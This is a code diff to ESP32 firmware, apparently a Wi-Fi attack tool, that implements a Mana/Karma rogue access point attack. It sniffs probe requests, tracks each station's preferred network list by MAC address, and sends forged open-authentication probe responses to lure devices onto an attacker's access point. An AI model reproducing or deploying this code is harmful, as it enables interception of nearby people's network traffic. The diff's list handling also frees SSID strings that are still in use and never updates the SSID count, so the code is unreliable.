@@ -15,8 +15,6 @@
 #include "esp_wifi_types.h"
 #include "probe.h"
 
-static const char* TAG = "GRAVITY";
-
 char **attack_ssids = NULL;
 char **user_ssids = NULL;
 int user_ssid_count = 0;
@@ -47,7 +45,7 @@ uint8_t probe_response_raw[] = {
 int PROBE_RESPONSE_DEST_ADDR_OFFSET = 4;
 int PROBE_RESPONSE_SRC_ADDR_OFFSET = 10;
 int PROBE_RESPONSE_BSSID_OFFSET = 16;
-int PROBE_RESPONSE_AUTH_OFFSET = 34;
+int PROBE_RESPONSE_PRIVACY_OFFSET = 34;
 int PROBE_RESPONSE_SSID_OFFSET = 38;
 
 #define PROMPT_STR CONFIG_IDF_TARGET
@@ -584,17 +582,92 @@ int cmd_handshake(int argc, char **argv) {
     return ESP_OK;
 }
 
-esp_err_t send_probe_response(char *srcAddr, char *destAddr, char *ssid) {
-    // TODO: Add auth_type as a parameter
+esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, enum PROBE_RESPONSE_AUTH_TYPE authType) {
     uint8_t probeBuffer[208];
-    // Bytes to SSID (correct src/dest later)
+
+    #ifdef DEBUG
+        printf("send_probe_response(): ");
+        char strSrcAddr[18];
+        char strDestAddr[18];
+        char strAuthType[15];
+        mac_bytes_to_string(srcAddr, strSrcAddr);
+        mac_bytes_to_string(destAddr, strDestAddr);
+        switch (authType) {
+        case AUTH_TYPE_NONE:
+            strcpy(strAuthType, "AUTH_TYPE_NONE");
+            break;
+        case AUTH_TYPE_WEP:
+            strcpy(strAuthType, "AUTH_TYPE_WEP");
+            break;
+        case AUTH_TYPE_WPA:
+            strcpy(strAuthType, "AUTH_TYPE_WPA");
+            break;
+        }
+        printf("srcAddr: %s\tdestAddr: %s\tSSID: \"%s\"\tauthType: %s\n", strSrcAddr, strDestAddr, ssid, strAuthType);
+    #endif
+
+    /* Copy bytes to SSID (correct src/dest later) */
     memcpy(probeBuffer, probe_response_raw, PROBE_RESPONSE_SSID_OFFSET - 1);
+    /* Replace SSID length and append SSID */
     probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1] = strlen(ssid);
     memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], ssid, strlen(ssid));
+    /* Append the remainder of the packet */
     memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET + strlen(ssid)], &probe_response_raw[PROBE_RESPONSE_SSID_OFFSET], sizeof(probe_response_raw) - PROBE_RESPONSE_SSID_OFFSET);
-    // TODO set src & dest
+    
+    /* Set source and dest MACs */
+    memcpy(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], srcAddr, 6);
+    memcpy(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], srcAddr, 6);
+    memcpy(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], destAddr, 6);
 
-    return ESP_OK;
+    /* Set authentication method */
+    uint8_t *bAuthType = NULL;
+    switch (authType) {
+    case AUTH_TYPE_NONE:
+        bAuthType = AUTH_TYPE_NONE_BYTES;
+        break;
+    case AUTH_TYPE_WEP:
+        bAuthType = AUTH_TYPE_WEP_BYTES;
+        break;
+    case AUTH_TYPE_WPA:
+        bAuthType = AUTH_TYPE_WPA_BYTES;
+        break;
+    default:
+        ESP_LOGE(MANA_TAG, "Unrecognised authentication type: %d\n", authType);
+        return ESP_ERR_INVALID_ARG;
+    }
+    memcpy(&probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], bAuthType, 2);
+
+    #ifdef DEBUG
+        char debugOut[1024];
+        int debugLen=0;
+        strcpy(debugOut, "SSID: \"");
+        debugLen += strlen("SSID: \"");
+        strncpy(&debugOut[debugLen], (char*)&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1]);
+        debugLen += probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1];
+        sprintf(&debugOut[debugLen], "\"\tsrcAddr: ");
+        debugLen += strlen("\"\tsrcAddr: ");
+        char strMac[18];
+        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], strMac);
+        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
+        debugLen += strlen(strMac);
+        sprintf(&debugOut[debugLen], "\tBSSID: ");
+        debugLen += strlen("\tBSSID: ");
+        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], strMac);
+        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
+        debugLen += strlen(strMac);
+        sprintf(&debugOut[debugLen], "\tdestAddr: ");
+        debugLen += strlen("\tdestAddr: ");
+        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], strMac);
+        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
+        debugLen += strlen(strMac);
+        sprintf(&debugOut[debugLen], "\tAuthType: \"0x%02x 0x%02x\"\n", probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET+1]);
+        debugLen += strlen("\tAuthType: \"0x 0x\"\n") + 4;
+        debugOut[debugLen] = '\0';
+        printf("About to transmit %s\n", debugOut);
+    #endif
+
+    // Send the frame
+    return esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, sizeof(probe_response_raw) + strlen(ssid), true);
 }
 
 void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
@@ -604,11 +677,13 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
         // No reason to listen to the packets
         return;
     }
+
     uint8_t *payload = data->payload;
     if (payload == NULL) {
         // Not necessarily an error, just a different payload
         return;
     }
+    // TODO: new file - parse_80211.c - Here call parse_80211_frame(payload)
     if (payload[0] == 0x40) {
         //printf("W00T! Got a probe request!\n");
         int ssid_len = payload[PROBE_SSID_OFFSET - 1];
@@ -616,17 +691,133 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
         // TODO: Check result
         strncpy(ssid, (char *)&payload[PROBE_SSID_OFFSET], ssid_len);
         ssid[ssid_len] = '\0';
-        char *srcMac = malloc(sizeof(char) * 18);
-        // TODO: Check result
-        esp_err_t err = mac_bytes_to_string(&payload[PROBE_SRCADDR_OFFSET], srcMac);
+        
         if (attack_status[ATTACK_SNIFF] || attack_status[ATTACK_MANA_VERBOSE]) {
-            ESP_LOGI(TAG, "Probe for \"%s\" from \"%s\"", ssid, srcMac);
+            char *srcMac = malloc(sizeof(char) * 18);
+            // TODO: Check result
+            esp_err_t err = mac_bytes_to_string(&payload[PROBE_SRCADDR_OFFSET], srcMac);
+            ESP_LOGI(TAG, "Probe for \"%s\" from %s", ssid, srcMac);
+            free(srcMac);
         }
         if (attack_status[ATTACK_MANA]) {
-            // Mana enabled - Send a probe response
-            // TODO : Config option to set auth type. For now just do open auth
-            // send_probe_response(srcMac=esp_wifi_get_mac, destMac=srcMac, ssid=ssid[, authType])
+            /* Mana enabled - Send a probe response
+               Get current MAC - NOTE: MAC hopping during the Mana attack will render the attack useless
+                                       Make sure you're not running a process that uses MAC randomisation at the same time
+            */
+            if (ssid_len == 0) {
+                /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
+                // TODO - networkList[i].mac === &payload[PROBE_SRCADDR_OFSET] for 6 bytes
+                //        iterate through networkList[i].ssidCount elements of networkList[i].ssids[]
+            } else {
+                /* Send a directed probe response in reply */
+                uint8_t bCurrentMac[6];
+                char strCurrentMac[18];
+                esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bCurrentMac);
+                if (err == ESP_OK) {
+                    mac_bytes_to_string(bCurrentMac, strCurrentMac);
+                } else {
+                    memcpy(bCurrentMac, &payload[PROBE_DESTADDR_OFFSET], 6);
+                    mac_bytes_to_string(bCurrentMac, strCurrentMac);
+                    ESP_LOGW(MANA_TAG, "Failed to get MAC from device, falling back to the frame's BSSID: %s\n", strCurrentMac);
+                }
+                /* Copy destMac into a 6-byte array */
+                uint8_t bDestMac[6];
+                memcpy(bDestMac, &payload[PROBE_SRCADDR_OFFSET], 6);
+
+                // TODO : Config option to set auth type. For now just do open auth
+
+                /* Mana attack - Add the current SSID to the station's preferred network
+                   list if it's not already there 
+                */
+                int i;
+                char strDestMac[18];
+                err = mac_bytes_to_string(bDestMac, strDestMac);
+                if (err != ESP_OK) {
+                    ESP_LOGE(MANA_TAG, "Unable to convert probe request source MAC from bytes to string: %s", esp_err_to_name(err));
+                    return;
+                }
+                /* Look for STA's MAC in networkList[] */
+                for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
+                if (i < networkCount) {
+                    /* The station is in networkList[] - See if it contains the SSID */
+                    int j;
+                    for (j=0; j < networkList[i].ssidCount && strcmp(ssid, networkList[i].ssids[j]); ++j) { }
+                    if (j == networkList[i].ssidCount) {
+                        /* SSID was not found in ssids, add it to the list */
+                        char **newSsids = malloc(sizeof(char *) * (j + 1));
+                        if (newSsids == NULL) {
+                            ESP_LOGW(MANA_TAG, "Unable to add SSID \"%s\" to PNL for STA %s", ssid, strDestMac);
+                        } else {
+                            /* Copy existing SSIDs to newSsids */
+                            for (int k=0; k < networkList[i].ssidCount; ++k) {
+                                newSsids[k] = networkList[i].ssids[k];
+                            }
+                            /* Append the new SSID */
+                            newSsids[j] = malloc(sizeof(char) * (strlen(ssid) + 1));
+                            if (newSsids[j] == NULL) {
+                                ESP_LOGW(MANA_TAG, "Failed to allocate bytes to hold SSID \"%s\" for STA %s", ssid, strDestMac);
+                                free(newSsids);
+                            } else {
+                                strcpy(newSsids[j], ssid);
+                                /* Only replace networkList[i].ssids with newSsids if we make it all this way */
+                                /* Free networkList[i].ssids elements and array */
+                                for (int k=0; k < networkList[i].ssidCount; ++k) {
+                                    free(networkList[i].ssids[k]);
+                                }
+                                free(networkList[i].ssids);
+                                networkList[i].ssids = newSsids;
+                            }
+                        }
+                    }
+                } else {
+                    /* Add the station to networkList[] */
+                    NetworkList *newList = malloc(sizeof(NetworkList) * (networkCount + 1));
+                    int newCount = networkCount + 1;
+                    if (newList == NULL) {
+                        ESP_LOGW(MANA_TAG, "Unable to allocate memory to hold the Preferred Network List for STA %s. This will downgrade the Mana attack to a Karma attack.", strDestMac);
+                    } else {
+                        /* Copy across elements from networkList[] */
+                        for (int j=0; j < networkCount; ++j) {
+                            newList[j].ssidCount = networkList[j].ssidCount;
+                            newList[j].ssids = networkList[j].ssids;
+                            strcpy(newList[j].strMac, networkList[j].strMac);
+                            memcpy(newList[j].bMac, networkList[j].bMac, 6);
+                        }
+                        /* Initialise a new NetworkList for this station */
+                        strcpy(newList[networkCount].strMac, strDestMac);
+                        memcpy(newList[networkCount].bMac, bDestMac, 6);
+                        newList[networkCount].ssidCount = 1;
+                        newList[networkCount].ssids = malloc(sizeof(char *));
+
+                        if (newList[networkCount].ssids == NULL) {
+                            ESP_LOGW(MANA_TAG, "Failed to allocate memory to hold SSID \"%s\" for STA %s. This SSID/STA pair will experience the Karma, not Mana, attack", ssid, strDestMac);
+                        } else {
+                            newList[networkCount].ssids[0] = malloc(sizeof(char) * (strlen(ssid) + 1));
+                            if (newList[networkCount].ssids[0] == NULL) {
+                                ESP_LOGW(MANA_TAG, "Failed to reserve bytes to hold SSID \"%s\" for STA %s. This SSID/STA tuple will get the Karma attack instead.", ssid, strDestMac);
+                            } else {
+                                strcpy(newList[networkCount].ssids[0], ssid);
+                            }
+                        }
+                        /* Replace networkList[] with newList[] - Without leaking memory */
+                        /* Loop through networkList[i].ssids and free each SSID before free'ing networkList itself*/
+                        for (int j=0; j < networkCount; ++j) {
+                            for (int k=0; k < networkList[j].ssidCount; ++k) {
+                                free(networkList[j].ssids[k]);
+                            }
+                            free(networkList[j].ssids);
+                        }
+                        free(networkList);
+                        networkList = newList;
+                        networkCount = newCount;
+                    }
+                }
+
+                /* Send probe response */
+                send_probe_response(bCurrentMac, bDestMac, ssid, AUTH_TYPE_NONE);
+            }
         }
+        free(ssid);
     } 
     return;
 }
@@ -744,8 +935,8 @@ void app_main(void)
     ESP_LOGI(TAG, "Command history disabled");
 #endif
 
-    esp_log_level_set("wifi", ESP_LOG_WARN);
-    esp_log_level_set("esp_netif_lwip", ESP_LOG_WARN);
+    esp_log_level_set("wifi", ESP_LOG_ERROR); /* TODO: Consider reducing these to ESP_LOG_WARN */
+    esp_log_level_set("esp_netif_lwip", ESP_LOG_ERROR);
     initialise_wifi();
     /* Register commands */
     esp_console_register_help_command();
